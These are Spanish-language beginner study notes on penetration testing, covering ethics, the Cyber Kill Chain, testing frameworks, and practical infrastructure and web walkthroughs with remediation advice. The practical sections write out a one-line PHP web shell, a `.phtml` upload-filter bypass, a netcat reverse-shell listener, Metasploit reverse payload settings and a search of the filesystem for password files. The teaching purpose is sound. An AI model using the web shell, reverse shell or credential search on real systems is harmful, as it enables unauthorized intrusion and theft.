# Apuntes de Fundamentos de Penetration Testing (Pentesting) para Principiantes

Estos apuntes estructurados compilan los conceptos clave, metodologías, marcos de trabajo y guías prácticas contenidos en tus fuentes de estudio sobre **Penetration Testing**.

---

## 1. Introducción y Fundamentos del Pentesting

### ¿Qué es el Penetration Testing?
Una **prueba de penetración (pentesting)** es una evaluación de seguridad autorizada realizada sobre sistemas, aplicaciones o redes. Se lleva a cabo con el permiso explícito del propietario del sistema y dentro de un alcance (scope) predefinido. Su objetivo principal es identificar vulnerabilidades antes de que atacantes maliciosos las exploten, permitiendo priorizar la remediación según el riesgo.

### Pentesting vs. Hacking Malicioso
Aunque ambas partes emplean herramientas similares, se diferencian fundamentalmente en:
* **Autorización:** El pentester opera con consentimiento escrito explícito; el atacante opera sin permiso.
* **Alcance:** El pentester se limita estrictamente al alcance acordado para proteger sistemas críticos; el atacante no tiene restricciones.
* **Cobertura:** El pentester busca evaluar ampliamente la postura de seguridad; el atacante busca la vía más rápida para su objetivo.
* **Responsabilidad:** El pentester actúa con profesionalismo e informa de sus hallazgos; el atacante descuida los daños causados.

### La Tríada: Vulnerabilidad, Amenaza y Riesgo
* **Vulnerabilidad:** Una debilidad o brecha en un sistema, software o configuración que puede ser explotada (ej. software desactualizado).
* **Amenaza:** Cualquier factor (humano, malicioso, automatizado con IA o evento no malicioso) con capacidad e intención de explotar una vulnerabilidad.
* **Riesgo:** El daño potencial que resulta si una amenaza explota con éxito una vulnerabilidad.
  * **Fórmula simplificada:** $\text{Riesgo} = \text{Vulnerabilidad} \times \text{Amenaza}$ (combinación de impacto y probabilidad).

### Ciclo de Gestión de Riesgos
1. **Identificación:** Mapeo de activos, vulnerabilidades y amenazas.
2. **Análisis:** Evaluación de probabilidad e impacto para definir la gravedad.
3. **Mitigación:** Aplicación de parches, controles de acceso y reconfiguraciones.
4. **Monitoreo:** Supervisión continua de controles y nuevas amenazas.
*(Opciones alternativas: **Aceptar el riesgo** si el costo de mitigación supera el beneficio, o **Transferir el riesgo** mediante un seguro cibernético).*

### Causas Comunes de Vulnerabilidades
* **Suposiciones humanas:** Asumir que los usuarios interactuarán con el sistema solo de la forma prevista (ej. subir scripts en vez de imágenes).
* **Errores de software (Bugs):** Fallas lógicas o falta de validación de entradas (ej. Inyección SQL).
* **Complejidad del sistema:** Múltiples componentes interconectados (APIs, microservicios) que facilitan errores de configuración.
* **Sobrepersonalización:** Implementaciones personalizadas que no siguen estándares de seguridad (ej. lógica de autenticación propia).
* **Defectos técnicos y de diseño:** Falta de seguridad desde la concepción del diseño (ej. emisión de sesión antes de completar MFA).

### La Mentalidad del Pentester y Ética
* **Mentalidad efectiva:** Curiosidad constante ("¿y si...?"), atención al detalle, pensamiento metódico y creativo, priorización de áreas críticas y comprensión del contexto del negocio.
* **Buenas prácticas:** Mantener notas detalladas, recopilar evidencias (capturas, registros), gestionar el tiempo e informar progresivamente.
* **Principios fundamentales:** **Ética** (respetar el alcance y proteger datos), **Permiso** (autorización por escrito) y **Confianza** (transparencia y profesionalismo).

---

## 2. La Cyber Kill Chain

La **Cyber Kill Chain**, desarrollada por Lockheed Martin en 2011, divide un ciberataque en siete etapas consecutivas:

1. **Reconocimiento (Reconnaissance):** Recopilación de información sobre el objetivo.
   * *Pasivo:* Sin interactuar directamente con la víctima (WHOIS, DNS, OSINT, Google Dorks).
   * *Activo:* Interactuando con los sistemas objetivo (escaneo de puertos, escaneo de vulnerabilidades, ingeniería social).
   * *Contramedidas:* Limitar exposición de información pública, monitorear tráfico y logs.
2. **Armamento (Weaponisation):** Creación o modificación de una carga útil (payload) maliciosa (ej. macros en documentos de Office, kits de explotación).
   * *Contramedidas:* Formación de usuarios, deshabilitar macros sin firmar.
3. **Entrega (Delivery):** Transmisión del payload al entorno objetivo (Phishing, enlaces maliciosos, USB, malvertising).
   * *Contramedidas:* Filtro de correo/web, Firewalls de Aplicaciones Web (WAF), concientización.
4. **Explotación (Exploitation):** Ejecución de la carga útil que aprovecha la vulnerabilidad (fuerza bruta de contraseñas, exploits de software, SQLi).
   * *Contramedidas:* Gestión de parches, MFA, uso de IPS/WAF.
5. **Instalación (Installation):** Establecimiento de acceso persistente en el sistema objetivo (puertas traseras, tareas programadas/cron, webshells, LOLBins).
   * *Contramedidas:* Soluciones EDR, monitoreo de nuevos procesos y servicios, listas blancas de aplicaciones.
6. **Comando y Control (C2):** Establecimiento de un canal encubierto entre el sistema comprometido y la infraestructura del atacante (usando HTTP/HTTPS, DNS Tunneling, DGA, Fast Flux).
   * *Contramedidas:* Inspección de tráfico cifrado, monitoreo de consultas DNS, Honeypots.
7. **Acciones sobre Objetivos (Actions on Objectives):** Ejecución del propósito final del ataque (exfiltración de datos, ransomware, destrucción de sistemas, movimiento lateral).
   * *Contramedidas:* Soluciones DLP, segmentación de red, copias de seguridad (backups), principio de menor privilegio.

---

## 3. Marcos de Trabajo en Pentesting (Frameworks)

Los marcos proporcionan una metodología estructurada para realizar evaluaciones sistemáticas, consistentes y repetibles.

| Marco / Estándar | Enfoque Principal | Características Clave |
| :--- | :--- | :--- |
| **OSSTMM** | Científico y cuantitativo | Mide la seguridad mediante métricas **RAV** (Valores de Evaluación de Riesgos) en 5 canales (Humana, Física, Inalámbrica, Telecomunicaciones, Datos). Genera informes **STAR**. |
| **OWASP WSTG** | Aplicaciones Web | Más de 90 casos de prueba en 12 categorías organizados a lo largo del ciclo de vida de desarrollo de software (SDLC). |
| **NIST SP 800-115** | Evaluación Técnica Gubernamental | Tres fases: Planificación, Ejecución (Técnicas de revisión, Identificación, Validación de vulnerabilidades y Pentest) y Post-prueba. |
| **PTES** | Práctico y Ciclo Completo | 7 fases prácticas de inicio a fin: Pre-compromiso, Recopilación de inteligencia, Modelado de amenazas, Análisis de vulnerabilidades, Explotación, Post-explotación y Reporte. |
| **ISSAF** | Histórico / Basado en Fases | Proceso de 3 fases con un modelo de evaluación de 9 pasos que refleja el progreso detallado de un atacante (Reconocimiento hasta Limpieza de huellas). |
| **MITRE ATT&CK** | Base de Conocimiento Complementaria | Matriz de 14 Tácticas, Técnicas y Subtécnicas basadas en el comportamiento real del adversario. No es una metodología, sino un lenguaje común para mapear hallazgos. |
| **Otros Marcos** | Especializados | **OWASP MASTG** (Aplicaciones móviles), **PCI DSS** (Datos de tarjetas de pago), **CBEST** (Sector financiero del Reino Unido), **CSA CCM** (Seguridad en la nube). |

---

## 4. Guía Práctica: Pentesting de Infraestructura

Un compromiso práctico de infraestructura sigue un flujo lógico continuo:

1. **Enumeración:** Recopilar datos detallados de la red y servicios antes de actuar.
   * *Escaneo con Nmap:* `nmap -sV -sC -oN scan.txt <IP_OBJETIVO>`.
     * `-sV`: Identifica versiones de servicios.
     * `-sC`: Ejecuta scripts por defecto de Nmap.
     * `-oN scan.txt`: Guarda la salida para documentación e informes.
2. **Análisis de Vulnerabilidades:** Interpretar los resultados del escaneo.
   * Búsqueda de exploits conocidos mediante herramientas locales como `searchsploit <servicio_version>` o motores de búsqueda.
3. **Acceso Inicial (Initial Access):** Explotación autorizada.
   * Uso del marco **Metasploit** (`msfconsole`).
   * Selección del módulo (`search`, `use`), configuración de parámetros obligatorios (`set RHOSTS <IP>`, `set LHOST <IP>`, `set LPORT 443`) y selección de payload (`set payload cmd/unix/reverse`).
   * Lanzamiento del ataque con `exploit`.
4. **Post-Explotación y Escalada de Privilegios:**
   * Búsqueda de archivos sensibles y credenciales expuestas en texto plano (ej. `find / -name password* 2>/dev/null` para ubicar `/etc/password.txt`).
   * Conexión por SSH con privilegios elevados (`ssh root@<IP>`).
   * *Nota TTY:* Un shell inverso básico suele ser un shell "tonto"; interactuar con comandos como `su` o `sudo` requiere la actualización a un TTY interactivo completo.
5. **Redacción del Informe (Reporting):**
   * El informe es el entregable principal. Debe incluir: Portada, Resumen Ejecutivo (no técnico), Resumen Técnico, Tabla de Vulnerabilidades ordenadas por gravedad y Sección Detallada de Explotación con pasos de reproducción y recomendaciones de mitigación.

---

## 5. Guía Práctica: Pentesting Web

El pentesting en aplicaciones web evalúa la interacción entre el navegador, la aplicación y la infraestructura backend (pila LAMP: Apache + PHP + MySQL, etc.).

### Flujo de Trabajo en Auditoría Web
1. **Reconocimiento y Enumeración de Directorios:**
   * Identificación de puertos abiertos (80 HTTP, 443 HTTPS, 3306 MySQL, 22 SSH) y encabezados HTTP.
   * Descubrimiento de rutas ocultas mediante herramientas como **Gobuster** (`/admin`, `/api`, `/reset.php`, `/uploads`).
2. **Explotación de IDOR (Insecure Direct Object References):**
   * Ocurre cuando la aplicación utiliza identificadores predecibles sin verificar la autorización del usuario autenticado.
   * *Ejemplo:* Cambiar `profile.php?id=6` por `profile.php?id=1` o consultar puntos finales de API (`/api/user?id=1`) permite exfiltrar información confidencial del administrador.
3. **Abuso de Restablecimiento Débil de Contraseñas:**
   * Fallas en el flujo de recuperación: Tokens generados de forma predecible (6 dígitos), ausencia de limitación de tasa (rate limiting) o exposición directa del token en la respuesta HTTP.
4. **Bypass en la Carga de Archivos (File Upload) y RCE:**
   * Las restricciones únicamente del lado del cliente (atributos HTML `accept`) son fácilmente omitibles.
   * Si existe una lista negra incompleta de extensiones (bloqueando `.php` pero permitiendo extensiones alternativas como `.phtml`), el servidor procesará el script malicioso.
   * **Web Shell:** Creación de un script PHP sencillo (`<?php echo shell_exec($_GET['cmd']); ?>`) para ejecutar comandos del sistema operativo desde la URL.
   * **Reverse Shell:** Establecimiento de un oyente local (`nc -lvnp 4444`) y activación de una carga útil para obtener un shell interactivo en el servidor.

### Matriz de Remediación
* **IDOR:** Implementar controles de autorización y verificación de permisos en el lado del servidor antes de devolver cualquier recurso.
* **Restablecimiento de Contraseñas:** Enviar tokens únicamente por correo electrónico, utilizar tokens criptográficamente seguros de al menos 32 caracteres y limitar el número de intentos.
* **Carga de Archivos:** Usar una lista de extensión permitida (allowlist), validar el contenido/tipo MIME, renombrar archivos y almacenarlos fuera de la raíz web (`web root`).
